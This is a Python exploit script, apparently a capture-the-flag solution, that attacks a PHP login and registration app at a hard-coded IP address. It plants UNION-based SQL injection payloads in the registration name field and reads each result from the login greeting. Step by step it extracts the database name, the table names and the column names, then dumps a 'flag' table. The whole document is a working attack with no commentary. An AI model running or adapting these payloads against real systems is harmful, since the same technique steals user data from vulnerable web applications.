import requests
import random
import string

base_url = 'http://35.220.140.18:8080/'

s = requests.Session()

def get_random_string(length):
	letters = string.ascii_lowercase
	result_str = ''.join(random.choice(letters) for i in range(length))
	return result_str

def exploit(payload):
	rand = get_random_string(8)

	# Register
	register_data = {
		'name': payload,
		'password': rand,
		'confirm': rand,
		'email': rand + '@mail.com',
		'submit': 'Register'
	}

	r = s.post(base_url + 'register.php', data=register_data)
	assert 'Sign Up Success!' in r.text

	# Login
	login_data = {
		'email': rand + '@mail.com',
		'password': rand,
		'submit': 'Login'
	}
	r = s.post(base_url + 'login.php', data=login_data)
	assert 'Hi' in r.text
	return r.text.split('>')[1].split('<')[0]

# Get database
# main
payload = "' union select database() limit 1,1-- -"
database = exploit(payload)
#print(database)

# Get tables
# flag,user
payload = "' union select group_concat(table_name) from information_schema.tables where table_schema='main' limit 1,1-- -"
tables = exploit(payload)
#print(tables)

# Get columns
# flag
# flag
payload = "' union select group_concat(column_name) from information_schema.columns where table_schema='main' AND table_name='flag' limit 1,1-- -"
columns = exploit(payload)
#print(columns)

# Get flag
payload = "' union select group_concat(flag) from main.flag limit 1,1-- -"
flag = exploit(payload)
print(flag)